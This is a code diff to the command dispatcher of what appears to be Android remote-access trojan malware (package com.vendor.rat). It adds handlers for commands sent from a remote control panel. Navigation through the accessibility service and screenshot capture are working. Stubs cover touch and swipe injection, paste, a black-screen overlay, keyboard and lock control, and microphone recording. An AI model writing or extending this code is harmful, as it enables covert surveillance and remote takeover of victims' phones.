@@ -1,5 +1,6 @@
 package com.vendor.rat.control.handler;
 
+import android.accessibilityservice.AccessibilityService;
 import android.util.Log;
 
 import com.google.gson.JsonObject;
@@ -8,6 +9,7 @@ import com.google.gson.JsonParser;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.CommandHandler;
+import com.vendor.rat.service.MyAccessibilityService;
 
 /**
  * 指令分发器 (唯一的 WebSocket CommandListener)
@@ -60,6 +62,19 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 return;
             }
 
+            // Laravel PanelHandler 下发: type="screen", subc="nav/mov/paste/block/..."
+            if ("screen".equals(type)) {
+                dispatchScreenAction(subc, json);
+                return;
+            }
+
+            // Laravel PanelHandler: type="mic", subc="ON/OFF"
+            if ("mic".equals(type)) {
+                Log.d(TAG, "mic command: subc=" + subc);
+                // TODO: 麦克风录音模块
+                return;
+            }
+
             // 兼容旧数字 type 格式 (来自本地 HttpCommandServer)
             if (json.has("type") && json.get("type").isJsonPrimitive()) {
                 try {
@@ -104,12 +119,113 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
         }
         switch (subc) {
             case "Screen":      screenshotHandler.handle(payload); break;
+            case "out":         screenshotHandler.handle(payload); break;
             // TODO: 其他命令在各模块实现后补充
-            // case "Camera":   break;
-            // case "SMS":      break;
-            // case "files":    break;
             default:
                 Log.d(TAG, "screencomd not yet handled: " + subc);
         }
+    }
+
+    /**
+     * 分发 Laravel PanelHandler screen 操作命令
+     * 对齐 PanelHandler.handleScreenCommand() 的 type="screen" 命令
+     *
+     * 格式: {"type":"screen", "subc":"nav/mov/paste/block/...", ...fields}
+     */
+    private void dispatchScreenAction(String subc, JsonObject payload) {
+        if (subc == null) {
+            Log.w(TAG, "screen action with null subc");
+            return;
+        }
+        Log.d(TAG, "screen action: subc=" + subc);
+
+        switch (subc) {
+            case "nav":
+                handleNav(payload);
+                break;
+            case "mov":
+                handleMov(payload);
+                break;
+            case "snap":
+                handleSnap(payload);
+                break;
+            case "paste":
+                Log.d(TAG, "paste: " + payload.toString());
+                // TODO: 粘贴文本到当前焦点
+                break;
+            case "block":
+                Log.d(TAG, "block: " + payload.toString());
+                // TODO: 黑屏遮罩
+                break;
+            case "vol":
+                Log.d(TAG, "volume: " + payload.toString());
+                // TODO: 音量控制
+                break;
+            case "kb":
+                Log.d(TAG, "keyboard: " + payload.toString());
+                // TODO: 键盘控制
+                break;
+            case "L":
+                Log.d(TAG, "lock: " + payload.toString());
+                // TODO: 锁屏控制
+                break;
+            case "Q":
+                Log.d(TAG, "quality: " + payload.toString());
+                // TODO: 投屏画质调整
+                break;
+            case "out":
+                screenshotHandler.handle(payload);
+                break;
+            default:
+                Log.d(TAG, "screen action not yet handled: " + subc);
+        }
+    }
+
+    /**
+     * 导航: home / back / recent
+     * 格式: {"type":"screen", "subc":"nav", "nav":"ho/bak/rec"}
+     */
+    private void handleNav(JsonObject payload) {
+        String nav = payload.has("nav") ? payload.get("nav").getAsString() : "";
+        Log.d(TAG, "nav: " + nav);
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null) {
+            Log.w(TAG, "nav: AccessibilityService not available");
+            return;
+        }
+
+        int action;
+        switch (nav) {
+            case "ho":  action = AccessibilityService.GLOBAL_ACTION_HOME; break;
+            case "bak": action = AccessibilityService.GLOBAL_ACTION_BACK; break;
+            case "rec": action = AccessibilityService.GLOBAL_ACTION_RECENTS; break;
+            default:
+                Log.w(TAG, "nav: unknown nav=" + nav);
+                return;
+        }
+
+        service.performGlobalAction(action);
+    }
+
+    /**
+     * 触摸/滑动操作
+     * 格式: {"type":"screen", "subc":"mov", "poi":"x,y" 或 "x1,y1,x2,y2", "movetype":"click/swipe"}
+     */
+    private void handleMov(JsonObject payload) {
+        String movetype = payload.has("movetype") ? payload.get("movetype").getAsString() : "";
+        Log.d(TAG, "mov: movetype=" + movetype + ", poi=" + payload.get("poi"));
+        // TODO: 通过 AccessibilityService.dispatchGesture() 实现触摸/滑动
+    }
+
+    /**
+     * 截图 (单次)
+     * 格式: {"type":"screen", "subc":"snap", "snaptype":"1"}
+     */
+    private void handleSnap(JsonObject payload) {
+        // 复用 screenshotHandler，构造 SM 命令
+        JsonObject cmd = new JsonObject();
+        cmd.addProperty("comdtype", "SM");
+        screenshotHandler.handle(cmd);
     }
 }
